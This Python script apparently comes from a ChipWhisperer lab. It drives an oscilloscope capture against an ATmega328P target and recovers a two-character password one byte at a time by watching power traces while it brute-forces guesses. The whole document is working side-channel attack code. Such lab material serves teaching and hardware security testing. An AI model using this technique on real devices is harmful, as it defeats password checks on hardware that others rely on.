from subprocess import call
import chipwhisperer.capture.ChipWhispererCapture as cwc
from chipwhisperer.capture.scopes.ChipWhispererExtra import CWPLLDriver
import time

try:
    from PySide.QtCore import *
    from PySide.QtGui import *
except ImportError:
    print "ERROR: PySide is required for this program"
    sys.exit()

def pe():
    QCoreApplication.processEvents()

def resetAVR():
	call(["/usr/bin/avrdude", "-c", "avrispmkII", "-p", "m328p"])

#Make the application
app = cwc.makeApplication()

#If you DO NOT want to overwrite/use settings from the GUI version including
#the recent files list, uncomment the following:
#app.setApplicationName("Capture V2 Scripted")

#Get main module
cap = cwc.ChipWhispererCapture()

#Show window - even if not used
cap.show()

#NB: Must call processEvents since we aren't using proper event loop
pe()

cap.setParameter(['Generic Settings', 'Scope Module', 'ChipWhisperer/OpenADC'])
cap.setParameter(['Generic Settings', 'Target Module', 'Simple Serial'])
cap.setParameter(['Target Connection', 'connection', 'ChipWhisperer'])

#Load FW (must be configured in GUI first)
cap.FWLoaderGo()

#NOTE: You MUST add this call to pe() to process events. This is done automatically
#for setParameter() calls, but everything else REQUIRES this, since if you don't
#signals will NOT be processed correctly
pe()

#Connect to scope
cap.doConDisScope(True)
pe()

cmds = [
['OpenADC', 'Gain Setting', 'Setting', 40],
['OpenADC', 'Trigger Setup', 'Mode', 'falling edge'],
['OpenADC', 'Trigger Setup', 'Timeout (secs)', 7.0],
['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'EXTCLK x1 via DCM'],
['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Front Panel A', False],
['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Target IO1 (Serial TXD)', True],
['CW Extra', 'CW Extra Settings', 'Clock Source', 'Target IO-IN'],
['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None]
]

for cmd in cmds: cap.setParameter(cmd)

#Connect to serial port
ser = cap.target.driver.ser
ser.con()

#Set baud rate
cap.setParameter(['Serial Port Settings', 'TX Baud', 9600])
cap.setParameter(['Serial Port Settings', 'RX Baud', 9600])

#Attach special method so we can call from GUI if wanted
cap.resetAVR = resetAVR

#Some useful commands to play with from GUI
#self.resetAVR()
#ser = self.target.driver.ser
#ser.write("@@@")
#ser.write("ce")
#print ser.read(255)

#Run Application
#app.exec_()

lowest = 32
highest = 126
pass_array = [lowest, lowest]
bytefound = [0, 0]
done = 0
while not done:
    cap.resetAVR()
    time.sleep(0.1)
    ser.write("@@@")
    time.sleep(0.1)
    cap.scope.arm()
    pe()
    ser.write(chr(pass_array[0]) + chr(pass_array[1]))
    if cap.scope.capture(update=True, NumberPoints=None, waitingCallback=pe):
        print "Timeout"
    else:
        print "Capture OK"
    
    print "Trying {0}{1}".format(chr(pass_array[0]), chr(pass_array[1]))
    if not bytefound[0] and min(cap.scope.datapoints[10000:14000]) > -0.1:
        print "Byte 1 Wrong"
        pass_array[0] += 1
    
    elif not bytefound[1] and min(cap.scope.datapoints[18000:22000]) > -0.1:
        bytefound[0] = 1
        print "Byte 2 Wrong"
        pass_array[1] += 1
    else:
        bytefound[1] = 1
        print "PASSWORD: {0}{1}".format(chr(pass_array[0]), chr(pass_array[1]))
        print "Password OK? Check response on serial"
        done = 1
    if pass_array[0] >= highest or pass_array[1] >= highest:
        print "Charset exceeded.  Expand range?"
        done = 1

#print ser.read(255)

#Run Application
app.exec_()

#Disconnect before exit to save grief
cap.scope.dis()
cap.target.dis()
